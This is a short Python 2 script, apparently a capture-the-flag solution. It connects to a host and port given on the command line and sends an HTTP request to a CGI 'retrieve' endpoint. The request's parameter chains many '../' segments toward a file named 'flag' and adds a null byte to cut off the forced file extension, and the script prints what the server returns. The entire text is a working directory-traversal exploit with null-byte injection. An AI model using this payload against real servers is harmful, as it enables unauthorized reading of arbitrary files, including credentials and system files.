import socket
import sys

try:
    host = sys.argv[1]
    port = int(sys.argv[2])
except:
    print "Usage: %s host port" % (sys.argv[0])
    exit(0)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s.send('GET /cgi-bin/retrieve?rfc=../../../../../../../../../../../../../../../../flag\x00&type=txt HTTP/1.0\r\n\r\n');
print s.recv(1024)
print s.recv(1024)
